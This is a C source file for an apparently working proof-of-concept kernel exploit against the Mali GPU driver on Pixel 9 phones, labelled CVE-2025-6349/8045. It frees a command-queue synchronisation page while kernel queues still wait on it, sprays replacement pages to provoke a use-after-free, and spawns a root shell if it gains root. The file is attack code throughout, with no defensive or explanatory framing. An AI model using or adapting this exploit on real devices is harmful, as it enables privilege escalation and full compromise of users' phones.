#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <dlfcn.h>

typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
typedef uint8_t  u8;
typedef int32_t  s32;

#define KBASE_IOCTL_TYPE  0x80

#define BASE_MEM_PROT_CPU_RD  (1u << 0)
#define BASE_MEM_PROT_CPU_WR  (1u << 1)
#define BASE_MEM_PROT_GPU_RD  (1u << 2)
#define BASE_MEM_PROT_GPU_WR  (1u << 3)
#define MEM_ALLOC_FLAGS (BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | \
                         BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR)

struct kbase_ioctl_version_check { u16 major; u16 minor; };
struct kbase_ioctl_set_flags { u32 create_flags; };
union kbase_ioctl_mem_alloc {
    struct { u64 va_pages; u64 commit_pages; u64 extension; u64 flags; } in;
    struct { u64 flags; u64 gpu_va; } out;
};
struct kbase_ioctl_mem_free { u64 gpu_addr; };
struct kbase_ioctl_cs_queue_register { u64 buffer_gpu_addr; u32 buffer_size; u8 priority; u8 padding[3]; };
union kbase_ioctl_cs_queue_bind {
    struct { u64 buffer_gpu_addr; u8 group_handle; u8 csi_index; u8 padding[6]; } in;
    struct { u64 mmap_handle; } out;
};
union kbase_ioctl_cs_queue_group_create {
    struct { u64 tiler_mask; u64 fragment_mask; u64 compute_mask; u8 cs_min; u8 priority; u8 tiler_max; u8 fragment_max; u8 compute_max; u8 csi_handlers; u8 padding[2]; u64 reserved; } in;
    struct { u8 group_handle; u8 padding[3]; u32 group_uid; } out;
};
struct kbase_ioctl_cs_queue_group_term { u8 group_handle; u8 padding[7]; };
typedef u8 base_kcpu_queue_id;
struct kbase_ioctl_kcpu_queue_new { base_kcpu_queue_id id; u8 padding[7]; };
struct kbase_ioctl_kcpu_queue_delete { base_kcpu_queue_id id; u8 padding[7]; };
struct kbase_ioctl_kcpu_queue_enqueue { u64 addr; u32 nr_commands; base_kcpu_queue_id id; u8 padding[3]; };

struct base_cqs_wait_info { u64 addr; u32 val; u32 padding; };
struct base_kcpu_command_cqs_wait_info { u64 objs; u32 nr_objs; u32 inherit_err_flags; };
struct base_kcpu_command { u8 type; u8 padding[7]; union { struct base_kcpu_command_cqs_wait_info cqs_wait; u64 raw[2]; } info; };

#define KBASE_IOCTL_VERSION_CHECK         _IOWR(KBASE_IOCTL_TYPE, 52, struct kbase_ioctl_version_check)
#define KBASE_IOCTL_SET_FLAGS             _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
#define KBASE_IOCTL_MEM_ALLOC             _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)
#define KBASE_IOCTL_MEM_FREE              _IOW(KBASE_IOCTL_TYPE, 7, struct kbase_ioctl_mem_free)
#define KBASE_IOCTL_CS_QUEUE_REGISTER     _IOW(KBASE_IOCTL_TYPE, 36, struct kbase_ioctl_cs_queue_register)
#define KBASE_IOCTL_CS_QUEUE_BIND         _IOWR(KBASE_IOCTL_TYPE, 39, union kbase_ioctl_cs_queue_bind)
#define KBASE_IOCTL_CS_QUEUE_GROUP_CREATE _IOWR(KBASE_IOCTL_TYPE, 58, union kbase_ioctl_cs_queue_group_create)
#define KBASE_IOCTL_KCPU_QUEUE_CREATE     _IOR(KBASE_IOCTL_TYPE, 45, struct kbase_ioctl_kcpu_queue_new)
#define KBASE_IOCTL_KCPU_QUEUE_DELETE     _IOW(KBASE_IOCTL_TYPE, 46, struct kbase_ioctl_kcpu_queue_delete)
#define KBASE_IOCTL_KCPU_QUEUE_ENQUEUE    _IOW(KBASE_IOCTL_TYPE, 47, struct kbase_ioctl_kcpu_queue_enqueue)

static int mali_fd = -1;
static u64 cqs_va_track = 0;
static volatile int got_uaf = 0;

static u64 gpu_alloc(int fd, u64 pages, u64 commit, u64 flags) {
    union kbase_ioctl_mem_alloc a = {0};
    a.in.va_pages = pages; a.in.commit_pages = commit; a.in.flags = flags;
    if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &a) < 0) return 0;
    return a.out.gpu_va;
}

static void gpu_free(int fd, u64 va) {
    struct kbase_ioctl_mem_free f = { .gpu_addr = va };
    ioctl(fd, KBASE_IOCTL_MEM_FREE, &f);
}

static int find_mali_fd(void) {
    for (int i = 3; i < 1024; i++) {
        char link[64], target[512];
        snprintf(link, sizeof(link), "/proc/self/fd/%d", i);
        ssize_t len = readlink(link, target, sizeof(target)-1);
        if (len <= 0) continue;
        target[len] = 0;
        if (strcmp(target, "/dev/mali0") == 0 || strcmp(target, "/dev/mali") == 0)
            return i;
    }
    return -1;
}

static int init_opencl(void) {
    const char* preloads[] = {
        "/system/lib64/liblog.so", "/system/lib64/libbase.so",
        "/system/lib64/libutils.so", "/system/lib64/libnativewindow.so",
        "/system/lib64/libhardware.so", NULL
    };
    for (int i = 0; preloads[i]; i++)
        dlopen(preloads[i], RTLD_LAZY | RTLD_GLOBAL);

    void* lib = dlopen("/system/lib64/libOpenCL.so", RTLD_LAZY);
    if (!lib) lib = dlopen("/vendor/lib64/libOpenCL.so", RTLD_LAZY);
    if (!lib) { fprintf(stderr, "  No libOpenCL.so\n"); return -1; }

    s32 (*get_plat)(u32,void*,u32*) = dlsym(lib,"clGetPlatformIDs");
    s32 (*get_dev)(void*,u64,u32,void*,u32*) = dlsym(lib,"clGetDeviceIDs");
    void* (*mk_ctx)(void*,u32,void*,void*,void*,s32*) = dlsym(lib,"clCreateContext");
    void* (*mk_q)(void*,void*,void*,s32*) = dlsym(lib,"clCreateCommandQueueWithProperties");
    if (!get_plat||!get_dev||!mk_ctx||!mk_q) { fprintf(stderr,"  Missing OpenCL symbols\n"); return -1; }

    s32 r; void* plat=0; u32 np=0;
    r=get_plat(1,&plat,&np); if(r||!plat){fprintf(stderr,"  clGetPlatformIDs: %d\n",r);return -1;}
    void* dev=0; u32 nd=0;
    r=get_dev(plat,4,1,&dev,&nd); if(r||!dev){fprintf(stderr,"  clGetDeviceIDs: %d\n",r);return -1;}
    void* ctx=mk_ctx(NULL,1,&dev,NULL,NULL,&r); if(r||!ctx){fprintf(stderr,"  clCreateContext: %d\n",r);return -1;}
    void* q=mk_q(ctx,dev,NULL,&r); if(r||!q){fprintf(stderr,"  clCreateCommandQueue: %d\n",r);return -1;}

    int fd = find_mali_fd();
    if (fd < 0) { fprintf(stderr, "  mali FD not found after OpenCL init\n"); return -1; }
    mali_fd = fd;
    printf("[+] Mali FD=%d via OpenCL\n", mali_fd);
    return 0;
}

#define MAX_KCPU  32
#define MAX_SPRAY 64

struct spray_state {
    int fd;
    u64 va[MAX_SPRAY];
    void* map[MAX_SPRAY];
    int count;
};

static void* spray_thread(void* arg) {
    struct spray_state* s = (struct spray_state*)arg;
    s->fd = open("/dev/mali0", O_RDWR);
    if (s->fd < 0) return NULL;

    struct kbase_ioctl_set_flags fl = {0};
    ioctl(s->fd, KBASE_IOCTL_SET_FLAGS, &fl);

    for (int i = 0; i < MAX_SPRAY; i++) {
        s->va[i] = gpu_alloc(s->fd, 1, 1, MEM_ALLOC_FLAGS);
        if (!s->va[i]) break;
        s->map[i] = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, s->fd, s->va[i]);
        if (s->map[i] != MAP_FAILED) {
            memset(s->map[i], 0xAA, 0x1000);  // known pattern
            s->count++;
        }
    }
    printf("[+] Spray thread: %d pages allocated\n", s->count);
    return NULL;
}

static void* kcpu_delete_thread(void* arg) {
    u8* ids = (u8*)arg;
    usleep(2000000);
    printf("[*] Deleting KCPU queues...\n");
    for (int i = 0; i < MAX_KCPU; i++) {
        if (ids[i] != 0xFF) {
            struct kbase_ioctl_kcpu_queue_delete kd = {.id = ids[i]};
            ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_DELETE, &kd);
            ids[i] = 0xFF;
        }
    }
    return NULL;
}

int main(int argc, char **argv) {
    int timeout_ms = (argc > 1) ? atoi(argv[1]) : 5000;

    printf("=================================================\n");
    printf("CVE-2025-6349/8045 POC v5 - Pixel 9\n");
    printf("CQS UAF via KCPU dump path\n");
    printf("Timeout: %dms\n", timeout_ms);
    printf("=================================================\n\n");
    setbuf(stdout, NULL);

    printf("[*] Phase 0: Init\n");
    if (init_opencl() < 0) {
        fprintf(stderr, "[-] OpenCL init failed\n"); return 1;
    }

    printf("\n[*] Phase 1: Allocate CQS + KCPU queues\n");

    u64 cqs_va = gpu_alloc(mali_fd, 1, 1, MEM_ALLOC_FLAGS);
    if (!cqs_va) { printf("[-] CQS alloc failed\n"); return 1; }
    printf("[+] CQS VA: 0x%llx\n", (unsigned long long)cqs_va);

    void* cqs_map = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, mali_fd, cqs_va);
    if (cqs_map == MAP_FAILED) { perror("  mmap CQS"); cqs_map = NULL; }
    else {
        volatile u32* v = (volatile u32*)cqs_map;
        *v = 0;
        printf("[+] CQS mapped: %p (val=0)\n", cqs_map);
    }

    u8 kids[MAX_KCPU]; int nk = 0;
    for (int i = 0; i < MAX_KCPU; i++) {
        struct kbase_ioctl_kcpu_queue_new kn = {0};
        if (ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_CREATE, &kn) < 0) break;
        kids[i] = kn.id; nk++;
    }
    printf("[+] %d KCPU queues created\n", nk);

    int n_enqueued = 0;
    for (int i = 0; i < nk; i++) {
        struct base_cqs_wait_info wi = {.addr = cqs_va, .val = 0xDEAD};
        struct base_kcpu_command cmd = {0};
        cmd.type = 2; /* CQS_WAIT */
        cmd.info.cqs_wait.objs = (u64)&wi;
        cmd.info.cqs_wait.nr_objs = 1;
        cmd.info.cqs_wait.inherit_err_flags = 0;
        struct kbase_ioctl_kcpu_queue_enqueue enq = {
            .addr = (u64)&cmd, .nr_commands = 1, .id = kids[i]
        };
        if (ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_ENQUEUE, &enq) < 0) {
            if (i == 0) printf("  CQS_WAIT enqueue: %s\n", strerror(errno));
            break;
        }
        n_enqueued++;
    }
    printf("[+] %d KCPU queues blocked on CQS_WAIT(val=0xDEAD)\n", n_enqueued);

    printf("\n[*] Phase 2: Drain mempool then free CQS\n");

    u64 drain[128]; int nd = 0;
    for (int i = 0; i < 128 && nd < 128; i++) {
        u64 va = gpu_alloc(mali_fd, 1, 1, MEM_ALLOC_FLAGS);
        if (!va) break;
        drain[nd++] = va;
    }
    printf("[+] Drained %d pages from mempool\n", nd);

    printf("[*] Freeing CQS at VA 0x%llx...\n", (unsigned long long)cqs_va);
    if (cqs_map) munmap(cqs_map, 0x1000);
    gpu_free(mali_fd, cqs_va);
    printf("[+] CQS freed — KCPU queues now reference freed page!\n");

    printf("[*] Freeing drain pages back to mempool...\n");
    for (int i = 0; i < nd; i++) gpu_free(mali_fd, drain[i]);

    printf("\n[*] Phase 3: Spray to replace CQS page\n");

    struct spray_state spray = { .fd = -1 };
    pthread_t spray_th;
    pthread_create(&spray_th, NULL, spray_thread, &spray);

    usleep(500000);

    printf("[*] Phase 4: Delete KCPU queues (triggers UAF read)\n");

    pthread_t del_th;
    pthread_create(&del_th, NULL, kcpu_delete_thread, kids);

    printf("[*] Waiting %dms...\n\n", timeout_ms);
    usleep(timeout_ms * 1000);

    for (int i = 0; i < n_enqueued; i++) {
        if (kids[i] != 0xFF) {
            struct kbase_ioctl_kcpu_queue_delete kd = {.id = kids[i]};
            ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_DELETE, &kd);
            kids[i] = 0xFF;
        }
    }

    pthread_join(del_th, NULL);
    pthread_join(spray_th, NULL);

    printf("\n[*] Phase 5: UAF Detection\n");
    printf("--------------------------\n");

    if (cqs_va_track) {
        printf("[*] Attempting to detect if CQS page was reclaimed...\n");
        void* remap = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, mali_fd, cqs_va_track);
        if (remap != MAP_FAILED) {
            volatile unsigned char* p = (volatile unsigned char*)remap;
            int aa_count = 0, non_aa = 0;
            for (int i = 0; i < 0x1000; i++) {
                if (p[i] == 0xAA) aa_count++;
                else non_aa++;
            }
            printf("[+] Remapped CQS_VA: %p\n", remap);
            printf("[+]   0xAA bytes: %d, non-0xAA: %d\n", aa_count, non_aa);
            if (non_aa > 0) {
                printf("[!!!] PAGE CORRUPTED — kernel wrote to reclaimed page!\n");
                got_uaf = 1;
            } else {
                printf("[*] Page still clean (0xAA) — may not have been reclaimed\n");
            }
            munmap(remap, 0x1000);
        } else {
            printf("[-] Could not remap CQS_VA (errno=%d) — page may be permanently freed\n", errno);
        }
    }

    // Check spray pages for corruption
    if (spray.count > 0 && spray.map[0]) {
        printf("[*] Checking sprayed pages for corruption...\n");
        for (int i = 0; i < spray.count; i++) {
            volatile unsigned char* p = (volatile unsigned char*)spray.map[i];
            int bad = 0;
            for (int j = 0; j < 64; j++) {  // sample 64 bytes
                if (p[j] != 0xAA) { bad = 1; break; }
            }
            if (bad) {
                printf("[!!!] Spray page %d (VA=0x%llx) CORRUPTED!\n", i, (unsigned long long)spray.va[i]);
                got_uaf = 1;
                break;
            }
        }
    }

    printf("\n%s\n", got_uaf ? "[!!!] UAF CONFIRMED" : "[*] No corruption detected");
    printf("[*] dmesg: adb shell dmesg | grep -iE 'kasan|use-after-free|double-free|sync.*freed|mali|kbase'\n");
    printf("[*] UID: %d\n", getuid());
    if (getuid() == 0) { printf("[!!!] ROOT!\n"); system("/system/bin/sh"); }

    if (spray.fd > 0) {
        for (int i = 0; i < spray.count; i++) {
            if (spray.map[i]) munmap(spray.map[i], 0x1000);
        }
        close(spray.fd);
    }
    close(mali_fd);
    return got_uaf ? 42 : 0;
}